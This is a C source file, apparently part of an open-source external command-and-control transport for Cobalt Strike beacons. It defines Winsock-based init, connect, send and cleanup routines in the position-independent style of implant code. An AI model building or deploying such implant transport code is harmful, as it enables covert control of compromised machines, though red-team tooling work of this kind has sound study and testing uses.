/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * TransportInit
 *
 * Purpose:
 *
 * Creates the transport routines, and 
 * connects to the server.
 *
-*/
DEFINESEC(B) BOOL TransportInit( PBEACON_INSTANCE Ins )
{
	WSADATA wsd;

	return ! Ins->api.WSAStartup( MAKEWORD( 2, 2 ), &wsd ) 
		? TRUE : FALSE;
};

/*-
 *
 * TransportFree
 *
 * Purpose:
 *
 * Frees the transport routines, and
 * disconnects from the server.
 *
-*/
DEFINESEC(B) VOID TransportFree( PBEACON_INSTANCE Ins )
{
	Ins->api.closesocket( Ins->Socket );
	Ins->api.WSACleanup( );
};

/*-
 *
 * TransportConnect
 *
 * Purpose:
 *
 * Connects to the target so that the 
 * agent may begin the IO loop.
 *
-*/
DEFINESEC(B) BOOL TransportConnect( PBEACON_INSTANCE Ins, struct sockaddr_in sin )
{
	Ins->Socket = Ins->api.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 ); 

	return ! Ins->api.WSAConnect(
			Ins->Socket,
			CPTR( &sin ),
			sizeof( sin ),
			NULL,
			NULL,
			NULL,
			NULL
			) ? TRUE : FALSE;
};

/*-
 *
 * TransportSend
 *
 * Purpose:
 *
 * Send's data over the connected socket
 * of the specified length.
 *
-*/
DEFINESEC(B) BOOL TransportSend( PBEACON_INSTANCE Ins, PVOID Data, ULONG Size )
{
	return Ins->api.send(
			Ins->Socket,
			Data,
			Size,
			0
	) == Size ? TRUE : FALSE;
};
